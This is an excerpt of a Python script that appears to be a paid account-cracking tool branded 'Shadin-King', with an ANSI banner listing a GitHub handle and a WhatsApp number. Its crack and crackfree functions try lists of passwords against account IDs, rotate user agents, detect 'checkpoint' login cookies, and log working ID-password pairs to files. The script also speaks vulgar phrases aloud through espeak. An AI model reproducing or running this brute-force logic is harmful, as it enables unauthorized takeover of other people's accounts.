...
╠══[Github                   • \33[1;38mShadin-Obroy]   ║\33[1;34m   
╠══[Whatsapp                 •  01812775755 ]  ║\33[1;35m 
╠══[TOOLS                    •  PAID ]         ║ \33[1;32m   
╠══[VERSION                  •  1.0 ]          ║\033[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━=━━╝\033[1;31m"""
os.system('espeak -a 100 "Shadin-King টুটুল এর মারে চুদে দিলো"')
print(logo)
...
def login_lagi334():
    try:
        os.system('espeak -a 300 " Shadin-King Fuck SHADIN Tool Ok by"')
        print(logo)
        ses = requests.Session()
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[Shadin•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                os.system('espeak -a 300 " Shadin,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[Shadin-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                os.system('espeak -a 300 " Ok,  Shadin,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
